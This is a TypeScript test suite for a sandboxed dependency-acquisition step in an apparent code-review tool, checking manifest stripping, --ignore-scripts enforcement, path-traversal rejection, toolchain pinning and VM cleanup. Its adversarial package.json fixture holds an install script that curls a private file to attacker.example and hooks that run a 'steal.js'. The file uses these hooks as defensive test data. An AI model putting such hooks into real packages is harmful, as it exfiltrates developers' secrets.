import { expect, test } from "bun:test";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { SandboxSession } from "eve/sandbox";
import definition from "../agent/sandbox";
import { acquisitionNetworkPolicy, transferSandboxFile, withAcquisitionSandbox } from "../src/review/sandbox-acquisition";
import { acquireEnvironment, acquisitionDeclarationPath, acquisitionRustChannel, dependencyAcquisitionCommand, projectAcquisitionManifest } from "../src/review/environment-acquisition";
import { reviewNetworkPolicy } from "../src/github/review-workspace";

test("executable package configuration is not materialized in the acquisition VM", () => {
  const projected = JSON.parse(projectAcquisitionManifest(JSON.stringify({
    name: "adversarial", version: "1.0.0", dependencies: { library: "1.2.3" },
    scripts: { prepare: "curl https://attacker.example/$(cat /workspace/private)", postinstall: "node steal.js" },
    trustedDependencies: ["library"], bin: "steal.js", config: { node_options: "--require ./steal.js" },
    pnpm: { patchedDependencies: { library: "steal.js" } },
  })));
  expect(projected).toEqual({ name: "adversarial", version: "1.0.0", dependencies: { library: "1.2.3" } });
  for (const command of ["bun install --frozen-lockfile", "npm ci --no-audit --no-fund", "pnpm install --frozen-lockfile", "yarn install --frozen-lockfile"]) {
    expect(dependencyAcquisitionCommand(command)).toContain("--ignore-scripts");
  }
  expect(dependencyAcquisitionCommand("pnpm install --frozen-lockfile")).toContain("--ignore-pnpmfile");
  for (const command of ["uv sync --frozen", "gradle dependencies", "mvn dependency:go-offline", "swift package resolve", "lwpt install --frozen", "composer install", "yarn install --immutable"]) {
    expect(() => dependencyAcquisitionCommand(command)).toThrow("offline acquisition adapter");
  }
});

test("forged checkout inventory cannot write acquisition profiles or Git configuration", () => {
  for (const path of ["../.bash_profile", "/root/.npmrc", "a/../../.git/config", "a/.git/config", "a\\..\\.bashrc", "a\0/package.json"]) {
    expect(() => acquisitionDeclarationPath(path)).toThrow("Unsafe acquisition");
  }
  expect(acquisitionDeclarationPath("packages/client/package.json")).toBe("packages/client/package.json");
});

test("cargo fetch cannot activate a PR-provided path toolchain", () => {
  expect(() => acquisitionRustChannel(new Map([["rust-toolchain.toml", '[toolchain]\npath="node_modules/attacker"']]))).toThrow("official toolchain");
  expect(acquisitionRustChannel(new Map([["rust-toolchain.toml", '[toolchain]\nchannel="1.85.0"\npath="node_modules/attacker"']]))).toBe("1.85.0");
  expect(acquisitionRustChannel(new Map([["rust-toolchain", "nightly-2026-01-01\n"]]))).toBe("nightly-2026-01-01");
});

test("retries acquire a new VM and always delete it, including provisioning and export failures", async () => {
  const acquired: number[] = [];
  const deleted: number[] = [];
  const factory = async () => {
    const id = acquired.length;
    acquired.push(id);
    return { session: { id: String(id) } as SandboxSession, delete: async () => { deleted.push(id); } };
  };
  await expect(withAcquisitionSandbox(async () => { throw new Error("installer failed"); }, factory)).rejects.toThrow("installer failed");
  await expect(withAcquisitionSandbox(async (sandbox) => sandbox.id, factory)).resolves.toBe("1");
  expect(deleted).toEqual([0, 1]);

  let cleaned = false;
  let transferred = false;
  await expect(acquireEnvironment({ run: async () => ({ exitCode: 0, stdout: "", stderr: "" }), writeBinaryFile: async () => { transferred = true; } }, async () => {}, async () => ({
    session: { run: async ({ command }: { command: string }) => ({ exitCode: command.includes("sudo tar") ? 7 : 0, stdout: "", stderr: "export failed" }) } as unknown as SandboxSession,
    delete: async () => { cleaned = true; },
  }))).rejects.toThrow("Tool acquisition export failed");
  expect(cleaned).toBe(true);
  expect(transferred).toBe(false);
});

test("the permanent review policy cannot expose package registries or shared cloud hosting", () => {
  expect(reviewNetworkPolicy).toBe("deny-all");
  expect(JSON.stringify(acquisitionNetworkPolicy)).not.toContain("*.amazonaws.com");
  expect(JSON.stringify(acquisitionNetworkPolicy)).not.toContain("transform");
});

test("failed trusted template provisioning closes egress before Eve can cache it", async () => {
  const policies: unknown[] = [];
  const commands: string[] = [];
  await expect(definition.bootstrap!({ use: async () => ({
    setNetworkPolicy: async (policy: unknown) => { policies.push(policy); },
    run: async ({ command }: { command: string }) => { commands.push(command); return { exitCode: 17, stdout: "", stderr: "mirror unavailable" }; },
  }) as unknown as SandboxSession })).rejects.toThrow("bootstrap failed (exit 17)");
  expect(policies).toEqual([acquisitionNetworkPolicy, "deny-all"]);
  expect(commands).toHaveLength(1);
  expect(commands[0]).not.toContain("git checkout");
});

test("native file transfer uses bounded uploads while retaining every archive byte", async () => {
  const root = await mkdtemp(join(tmpdir(), "acquisition-transfer-"));
  const content = new Uint8Array(17 * 1024 * 1024 + 3);
  for (let index = 0; index < content.length; index++) content[index] = index % 251;
  const uploads: number[] = [];
  try {
    const source = join(root, "source");
    await mkdir(source);
    await writeFile(join(source, "review-environment.tar.gz"), content);
    await transferSandboxFile({
      readBinaryFile: async ({ path }) => readFile(path.replace("/tmp", source)),
      run: async ({ command }) => {
        const adjusted = command.replaceAll("/tmp", source).replace("stat -c '%s'", process.platform === "darwin" ? "stat -f '%z'" : "stat -c '%s'");
        const child = Bun.spawn(["sh", "-ec", adjusted], { stdout: "pipe", stderr: "pipe" });
        return { exitCode: await child.exited, stdout: await new Response(child.stdout).text(), stderr: await new Response(child.stderr).text() };
      },
    }, {
      writeBinaryFile: async ({ path, content }) => { uploads.push(content.length); await writeFile(path.replace("/tmp", root), content); },
      run: async ({ command }) => {
        const child = Bun.spawn(["sh", "-ec", command.replaceAll("/tmp", root)], { stdout: "pipe", stderr: "pipe" });
        return { exitCode: await child.exited, stdout: await new Response(child.stdout).text(), stderr: await new Response(child.stderr).text() };
      },
    }, "/tmp/review-environment.tar.gz");
    expect(uploads).toEqual([8 * 1024 * 1024, 8 * 1024 * 1024, 1024 * 1024 + 3]);
    expect(Buffer.compare(await readFile(join(root, "review-environment.tar.gz")), Buffer.from(content))).toBe(0);
  } finally { await rm(root, { recursive: true, force: true }); }
});
